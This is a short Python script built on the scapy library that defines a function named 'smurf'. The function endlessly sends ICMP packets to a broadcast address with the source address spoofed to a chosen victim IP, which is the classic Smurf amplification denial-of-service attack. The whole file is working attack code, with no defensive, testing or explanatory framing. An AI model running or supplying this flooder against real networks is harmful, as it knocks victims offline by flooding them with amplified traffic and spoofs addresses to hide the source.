from scapy.all import *
from scapy.layers.inet import IP, ICMP
def smurf(Ip,broadcastIP):
    srcaddr=Ip
    print("Sending packets to ",broadcastIP)
    print("Source is set to ",srcaddr)
    while True:
        pkt=IP(dst=broadcastIP,src=srcaddr)/ICMP()
        
        send(pkt)
